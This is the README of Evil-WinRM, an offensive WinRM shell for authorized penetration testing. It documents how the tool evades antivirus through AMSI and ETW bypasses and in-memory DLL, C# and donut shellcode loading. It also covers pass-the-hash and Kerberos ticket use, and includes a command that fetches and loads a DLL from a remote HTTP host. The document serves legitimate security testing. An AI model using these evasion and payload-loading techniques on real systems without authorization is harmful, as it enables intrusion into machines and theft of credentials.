# Evil-WinRM [![Version-shield]](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb) [![Ruby2.3-shield]](https://www.ruby-lang.org/en/news/2015/12/25/ruby-2-3-0-released/) [![Gem-Version]](https://rubygems.org/gems/evil-winrm) [![License-shield]](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE) [![Docker-shield]](https://hub.docker.com/r/oscarakaelvis/evil-winrm)
The ultimate WinRM shell for hacking/pentesting

![Banner](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png)

## Description & Purpose
This shell is the ultimate WinRM shell for hacking/pentesting.

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol
that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating
Systems in order to make life easier to system administrators.

This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only
if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting
phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate
purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.

It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM
protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.

## Features
 - Compatible to Linux and Windows client systems
 - Load in memory Powershell scripts
 - Load in memory dll files bypassing some AVs
 - Load in memory C# (C Sharp) assemblies bypassing some AVs
 - Load x64 payloads generated with awesome [donut] technique
 - Dynamic AMSI Bypass to avoid AV signatures
 - Pass-the-hash support
 - Kerberos auth support
 - SSL and certificates support
 - Upload and download files showing progress bar
 - List remote machine services without privileges
 - Command History
 - WinRM command completion
 - Local files/directories completion
 - Remote path (files/directories) completion (can be disabled optionally)
 - Colorization on prompt and output messages (can be disabled optionally)
 - Optional logging feature
 - Docker support (prebuilt images available at [Dockerhub])
 - Trap capturing to avoid accidental shell exit on Ctrl+C
 - Customizable user-agent using legitimate Windows default one
 - ETW (Event Tracing for Windows) bypass

## Help
```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -a, --user-agent                 Specify connection user-agent (default Microsoft WinRM Client)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

```

## Requirements
Ruby 2.3 or higher is needed. Some ruby gems are needed as well: `winrm >=2.3.7`, `winrm-fs >=1.3.2`, `stringio >=0.0.2`, `logger >= 1.4.3`, `fileutils >= 0.7.2`.
Depending of your installation method (4 availables) the installation of them could be required to be done manually.

Another important requirement only used for Kerberos auth is to install the Kerberos package used for network authentication.
For some Linux like Debian based (Kali, Parrot, etc.) it is called `krb5-user`. For BlackArch it is called `krb5` and probably it could be called in a different way for other Linux distributions.

The remote path completion feature will work only if your ruby was compiled enabling the `--with-readline-dir` flag. This is enabled by default in ruby included on some Linux distributions but not in all. Check [the section below](#Remote-path-completion) for more info.

## Installation & Quick Start (4 methods)

### Method 1. Installation directly as ruby gem (dependencies will be installed automatically on your system)
 - Step 1. Install it (it will install automatically dependencies): ```gem install evil-winrm```
 - Step 2. Ready. Just launch it!
```
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### Method 2. Git clone and install dependencies on your system manually
 - Step 1. Install dependencies manually: `sudo gem install winrm winrm-fs stringio logger fileutils`
 - Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
 - Step 3. Ready. Just launch it!
```
cd evil-winrm && ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### Method 3. Using bundler (dependencies will not be installed on your system, just to use evil-winrm)
 - Step 1. Install bundler: `gem install bundler`
 - Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
 - Step 3. Install dependencies with bundler: `cd evil-winrm && bundle install --path vendor/bundle`
 - Step 4. Launch it with bundler:
```
bundle exec evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```
### Method 4. Using Docker
 - Step 1. Launch docker container based on already built image:
```
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'
```

## Documentation

### Clear text password
If you don't want to put the password in clear text, you can optionally avoid to set `-p` argument and the password will be prompted preventing to be shown.

### Ipv6
To use IPv6, the address must be added to /etc/hosts. Just put the already set name of the host after `-i` argument instead of an IP address.

### Basic commands
 - **upload**: local files can be auto-completed using tab key.
   - usage: `upload local_filename` or `upload local_filename destination_filename`
 - **download**:
   - usage: `download remote_filename` or `download remote_filename destination_filename`

 __Notes about paths (upload/download)__:
   Relative paths are not allowed to use on download/upload. Use filenames on current directory or absolute path.
   If you are using Evil-WinRM in a docker environment, bear in mind that all local paths should be at `/data` and be pretty sure that you mapped it as a volume in order to be able to access to downloaded files or to be able to upload files from your local host O.S.

 - **services**: list all services showing if there your account has permissions over each one. No administrator permissions needed to use this feature.
 - **menu**: load the `Invoke-Binary`, `Dll-Loader` and `Donut-Loader` functions that we will explain below. When a ps1 is loaded all its functions will be shown up.

```
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

```

### Load powershell scripts
 - To load a ps1 file you just have to type the name (auto-completion using tab allowed). The scripts must be in the path set at `-s` argument. Type menu again and see the loaded functions. Very large files can take a long time to be loaded.

```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Add-DomainAltSecurityIdentity
[+] Add-DomainGroupMember
[+] Add-DomainObjectAcl
[+] Add-RemoteConnection
[+] Add-Win32Type
[+] Convert-ADName
[+] Convert-DNSRecord
[+] ConvertFrom-LDAPLogonHours
[+] ConvertFrom-SID
[+] ConvertFrom-UACValue
[+] Convert-LDAPProperty
[+] Convert-LogonHours
[+] ConvertTo-SID
[+] Dll-Loader
[+] Donut-Loader
[+] Export-PowerViewCSV
[+] field
[+] Find-DomainLocalGroupMember
```

### Advanced commands
- Invoke-Binary: allows .Net assemblies to be executed in memory. The name can be auto-completed using tab key. Arguments for the exe file can be passed comma separated. Example: `Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'`. The executables must be in the path set at `-e` argument.

```
*Evil-WinRM* PS C:\> Invoke-Binary
.SYNOPSIS
    Execute binaries from memory.
    PowerShell Function: Invoke-Binary
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Invoke-Binary /opt/csharp/Watson.exe
    Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3
    Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'
    Description
    -----------
    Function that execute binaries from memory.

*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


 Ticket requests and renewals:


```

 - Dll-Loader: allows loading dll libraries in memory, it is equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))`

   The dll file can be hosted by smb, http or locally. Once it is loaded type `menu`, then it is possible to autocomplete all functions.
```
*Evil-WinRM* PS C:\> Dll-Loader
.SYNOPSIS
    dll loader.
    PowerShell Function: Dll-Loader
    Author: Hector de Armas (3v4Si0N)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION
    .
.EXAMPLE
    Dll-Loader -smb -path \\192.168.139.132\\share\\myDll.dll
    Dll-Loader -local -path C:\Users\Pepito\Desktop\myDll.dll
    Dll-Loader -http -path http://example.com/myDll.dll

    Description
    -----------
    Function that loads an arbitrary dll

*Evil-WinRM* PS C:\> Dll-Loader -http http://10.10.10.10/SharpSploit.dll
[+] Reading dll by HTTP
[+] Loading dll...
*Evil-WinRM* PS C:\Users\test\Documents> menu

 [... Snip ...]

*Evil-WinRM* PS C:\> [SharpSploit.Enumeration.Host]::GetProcessList()


Pid          : 0
Ppid         : 0
Name         : Idle
Path         :
SessionID    : 0
Owner        :
Architecture : x64

```
 - Donut-Loader: allows to inject x64 payloads generated with awesome [donut] technique. No need to encode the payload.bin, just generate and inject!

```
*Evil-WinRM* PS C:\> Donut-Loader
.SYNOPSIS
    Donut Loader.
    PowerShell Function: Donut-Loader
    Author: Luis Vacas (CyberVaca)
    Based code: TheWover

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin
    Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin

    Description
    -----------
    Function that loads an arbitrary donut :D
```

You can use this [donut-maker] to generate the payload.bin if you don't use Windows.
This script use a python module written by Marcello Salvati ([byt3bl33d3r]). It could be installed using pip: `pip3 install donut-shellcode`

```
python3 donut-maker.py -i Covenant.exe

   ___  _____
 .'/,-Y"     "~-.
 l.Y             ^.
 /\               _\_      Donuts!
i            ___/"   "\
|          /"   "\   o !
l         ]     o !__./
 \ _  _    \.___./    "~\
  X \/ \            ___./
 ( \ ___.   _..--~~"   ~`-.
  ` Z,--   /               \
    \__.  (   /       ______)
      \   l  /-----~~" /
       Y   \          /
       |    "x______.^
       |           \
       j            Y



[+] Donut generated successfully: payload.bin
```

 - Bypass-4MSI: patchs AMSI protection.
```
*Evil-WinRM* PS C:\> #amsiscanbuffer
At line:1 char:1
+ #amsiscanbuffer
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\>
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\> #amsiscanbuffer
*Evil-WinRM* PS C:\>
```

### Kerberos
 - First you have to sync date with the DC: `rdate -n <dc_ip>`

 - To generate ticket there are many ways:

   * Using [ticketer.py] from impacket
   * If you get a kirbi ticket using [Rubeus] or [Mimikatz] you have to convert to ccache using [ticket_converter.py]

 - Add ccache ticket. There are 2 ways:

    `export KRB5CCNAME=/foo/var/ticket.ccache`

    `cp ticket.ccache /tmp/krb5cc_0`

 - Add realm to `/etc/krb5.conf` (for linux). Use of this format is important:

   ```
    CONTOSO.COM = {
                kdc = fooserver.contoso.com
    }
   ```

 - Check Kerberos tickets with `klist`
 - To remove ticket use: `kdestroy`
 - For more information about Kerberos check this [cheatsheet]

### Remote path completion
This feature could be not available depending of the ruby you are using. It must be compiled with readline support. Otherwise, this feature will not work (a warning will be shown).

#### Method 1 (compile the needed extension)

Using this method you'll compile ruby with the needed readline feature but to use only the library without changing the default ruby version on your system. Because of this, is the most recommended method.

Let's suppose that you have in your Debian based system ruby 2.7.3:

```
# Install needed package
apt install libreadline-dev

# Check your ruby version
ruby --version
ruby 2.7.3p183 (2021-04-05 revision 6847ee089d) [x86_64-linux-gnu]

# Download ruby source code (2.7.3 in this case):
wget https://ftp.ruby-lang.org/pub/ruby/2.7/ruby-2.7.3.tar.gz

# Extract source code
tar -xf ruby-2.7.3.tar.gz

# Compile the readline extension:
cd ruby-2.7.3/ext/readline
ruby ./extconf.rb
make

# Patch current version of the ruby readline extension:
sudo cp /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so.bk
sudo cp -f readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so
```

#### Method 2 (Install ruby to use it only for evil-winrm using rbenv)

Let's suppose that you want ruby 2.7.1 on a Debian based Linux and you are using zsh. This script will automatize it. You'll need to launch it from the same dir where evil-winrm.rb and Gemfile is located (the evil-winrm created dir after a git clone for example):

```
#!/usr/bin/env zsh

# Uninstall possible current installed versions
sudo gem uninstall evil-winrm -q
gem uninstall evil-winrm -q

# Install rbenv
sudo apt install rbenv

# Config rbenv on zshrc config file
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(rbenv init -)"' >> ~/.zshrc
source ~/.zshrc

# Install ruby with readline support
export RUBY_CONFIGURE_OPTS=--with-readline-dir="/usr/include/readline"
rbenv install 2.7.1

# Create file '.ruby-version' to set right ruby version
rbenv local 2.7.1

# Install local gems
gem install bundler
bundle install

current_evwr="$(pwd)/evil-winrm.rb"

sudo bash -c "cat << 'EOF' > /usr/bin/evil-winrm
    #!/usr/bin/env sh
    "${current_evwr}" "\$@"
EOF"

sudo chmod +x /usr/bin/evil-winrm
```

Then you can safely launch evil-winrm using the new installed ruby with the required readline support from any location.

#### Method 3 (compile entire ruby)

If you want to compile it yourself, you can follow these steps. Let's suppose that you want ruby 2.7.3:

```
wget -O ruby-install-0.8.1.tar.gz https://github.com/postmodern/ruby-install/archive/v0.8.1.tar.gz
tar -xzvf ruby-install-0.8.1.tar.gz
cd ruby-install-0.8.1/
sudo make install
ruby-install ruby 2.7.3 -- --with-readline-dir=/usr/include/readline
```
Depending of your system it will be installed at `/opt/rubies/ruby-2.7.3` or maybe at ` ~/.rubies/ruby-2.7.3`.

Now just need to install evil-winrm dependencies for that new installed ruby version. The easiest way is to launch command `/opt/rubies/ruby-2.7.3/bin/gem install evil-winrm`. The gem command used must be belonging to the new ruby installation.

After that, you can launch safely your new installed ruby to use it on evil-winrm: `/opt/rubies/ruby-2.7.3/bin/ruby ./evil-winrm.rb -h`

It is recommended to use this new installed ruby only to launch evil-winrm. If you set it up as your default ruby for your system, bear in mind that it has no dependency gems installed. Some ruby based software like Metasploit or others could not start correctly due dependencies problems.

### Logging

This feature will create files on your $HOME dir saving commands and the outputs of the WinRM sessions.

### Known problems. OpenSSL errors

Sometimes, you could face an error like this:

```
Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest initialization failed: initialization error
```

The error is caused because the OpenSSL 3.0 version retired some legacy functions like MD4 which are needed to run this tool. There are different existing workarounds to deal with this situation:

 - Update your system to the latest. Likely, this problem was automatically fixed on latest Ruby versions that are using newer OpenSSL versions.
 - Compile your own Ruby using old OpenSSL 1.x instead of OpenSSL 3.0 or compile it using OpenSSL > 3.0 to avoid the problematic 3.0 version.
 - The easiest one. Edit your `/etc/ssl/openssl.cnf` config file and be sure the config is like this:

```
openssl_conf = openssl_init

[openssl_init]
providers = provider_sect

[provider_sect]
default = default_sect
legacy = legacy_sect

[default_sect]
activate = 1

[legacy_sect]
activate = 1
```

 - As an alternative for the last workaround, if your system is using LibreSSL instead of OpenSSL or maybe you just don't want to modify your system config file. Create a simple file containing the above content. Any name can be used, for example `evil-tls.conf`. After that, export an environment var to force the system to use it: `export OPENSSL_CONF="/path/to/evil-tls.conf"`. And then launch the tool, the error will disappear.


## Changelog:
Changelog and project changes can be checked here: [CHANGELOG.md](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md)

## Credits:
Staff:

 - [Cybervaca], (founder). Twitter (X): [@CyberVaca_]
 - [OscarAkaElvis], Twitter (X): [@OscarAkaElvis]
 - [Jarilaos], Twitter (X): [@_Laox]
 - [arale61], Twitter (X): [@arale61]

Hat tip to:

 - [Vis0r] for his personal support.
 - [Alamot] for his original code.
 - [3v4Si0N] for his awesome dll loader.
 - [WinRb] All contributors of ruby library.
 - [TheWover] for his awesome donut tool.
 - [byt3bl33d3r] for his python library to create donut payloads.
 - [Sh11td0wn] for inspiration about new features.
 - [Borch] for his help adding logging feature.
 - [Hackplayers] for giving a shelter on their github to this software.

## Disclaimer & License
This script is licensed under LGPLv3+. Direct link to [License](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE).

Evil-WinRM should be used for authorized penetration testing and/or nonprofit educational purposes only.
Any misuse of this software will not be the responsibility of the author or of any other collaborator.
Use it at your own servers and/or with the server owner's permission.

<!-- Github URLs -->
[Cybervaca]: https://github.com/cybervaca
[OscarAkaElvis]: https://github.com/OscarAkaElvis
[Jarilaos]: https://github.com/jarilaos
[arale61]: https://github.com/arale61
[Vis0r]: https://github.com/vmotos
[Alamot]: https://github.com/Alamot
[3v4Si0N]: https://github.com/3v4Si0N
[Borch]: https://github.com/Stoo0rmq
[donut]: https://github.com/TheWover/donut
[donut-maker]: https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
[byt3bl33d3r]: https://twitter.com/byt3bl33d3r
[WinRb]: https://github.com/WinRb/WinRM/graphs/contributors
[TheWover]: https://github.com/TheWover
[Sh11td0wn]: https://github.com/Sh11td0wn
[ticketer.py]: https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
[ticket_converter.py]: https://github.com/Zer1t0/ticket_converter
[Rubeus]: https://github.com/GhostPack/Rubeus
[Mimikatz]: https://github.com/gentilkiwi/mimikatz
[cheatsheet]: https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
[Dockerhub]: https://hub.docker.com/r/oscarakaelvis/evil-winrm
[Hackplayers]: https://www.hackplayers.com/

<!-- Twitter URLs -->
[@CyberVaca_]: https://twitter.com/CyberVaca_
[@OscarAkaElvis]: https://twitter.com/OscarAkaElvis
[@_Laox]: https://twitter.com/_Laox
[@arale61]: https://twitter.com/arale61

<!-- Badges URLs -->
[Version-shield]: https://img.shields.io/badge/version-3.7-blue.svg?style=flat-square&colorA=273133&colorB=0093ee "Latest version"
[Ruby2.3-shield]: https://img.shields.io/badge/ruby-2.3%2B-blue.svg?style=flat-square&colorA=273133&colorB=ff0000 "Ruby 2.3 or later"
[License-shield]: https://img.shields.io/badge/license-LGPL%20v3%2B-blue.svg?style=flat-square&colorA=273133&colorB=bd0000 "LGPL v3+"
[Docker-shield]: https://img.shields.io/docker/automated/oscarakaelvis/evil-winrm.svg?style=flat-square&colorA=273133&colorB=a9a9a9 "Docker rules!"
[Gem-Version]: https://badge.fury.io/rb/evil-winrm.svg "Ruby gem"
